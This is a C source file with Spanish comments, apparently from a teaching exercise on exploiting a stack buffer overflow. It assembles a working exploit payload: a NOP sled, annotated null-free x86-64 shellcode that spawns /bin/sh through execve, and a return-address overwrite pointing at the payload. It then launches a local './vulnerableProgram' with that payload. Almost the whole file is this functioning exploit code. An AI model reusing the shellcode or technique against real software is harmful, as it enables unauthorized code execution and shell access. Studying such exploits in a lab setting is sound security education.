#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

int main(int argc, char *argv[]) {
  unsigned char payload[64+8+8]; // Total bytes = 64 (BUF) + 8 (rbp) + 8 (ret)

  // Inicializa el payload con NOPs (0x90) -> NOP sled
  memset(payload, 0x90, (64+8+8));

  unsigned char *p = payload; // puntero al payload para recorrerlo desde el inicio

  // Version: shellcode
/*  unsigned char shellcode[] = {
      0x48, 0x31, 0xc0, 
      0xb0, 0x3b, 
      0x48, 0x31, 0xff,
      0x57, 
      0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 
      0x57, 
      0x48, 0x89, 0xe7, 
      0x48, 0x31, 0xf6, 
      0x48, 0x31, 0xd2, 
      0x0f, 0x05, 
      0x5f
    };
*/

  // Version: shellcode_noNull
  unsigned char shellcode[] =
    "\x48\x31\xc0"                              // xor    rax, rax
    "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"  // mov    rbx, 0x68732f2f6e69622f  -> "/bin//sh"
    "\x53"                                      // push   rbx
    "\x48\x89\xe7"                              // mov    rdi, rsp
    "\x50"                                      // push   rax    ; coloca 0 en la pila (NULL execve : final de argumentos)
    "\x57"                                      // push   rdi    ; apunta a "/bin//sh"
    "\x48\x89\xe6"                              // mov    rsi, rsp
    "\x48\x83\xc0\x3b"                          // add    rax, 0x3b  ; número de syscall para execve
    "\x0f\x05";                                 // syscall

  // Inyectar shellcode en el payload
  p += 8; // saltamos 8 NOPs
  memcpy(p, shellcode, sizeof(shellcode)-1); // -1 para quitar el byte nulo del final 0x00
  
  // Sobreescribir la dirección de retorno con la dirección de inicio del payload
  p = payload;
  p += (64 + 8); // avanzamos al lugar de la dirección de retorno
  *(unsigned long long *)p = (unsigned long long)payload; //sobrescribir direccion retorno

  printf("Size of payload is %d.\n", sizeof(payload)); //comprobar tamaño del payload
  printf("La direccion de inicio del payload en la pila es %p \n", payload);

  // Imprimimos el payload en hexadecimal para verificar
  for (size_t i=0; i<(64+8+8); i++) {
    printf("%02x ", payload[i]); // Imprime cada byte en formato hexadecimal
    if ((i + 1) % 16 == 0) printf("\n"); // Salto de línea cada 16 bytes para mejor visualización
  }
  printf("\n");

  // Ejecutar el programa vulnerable con el payload como argumento
  char *args[] = {"./vulnerableProgram", (unsigned char *)payload, NULL};
  if (execve("./vulnerableProgram", args, NULL) == -1)
  {
    perror("Error en execve");
    return -1;
  }

  return 0;
}
 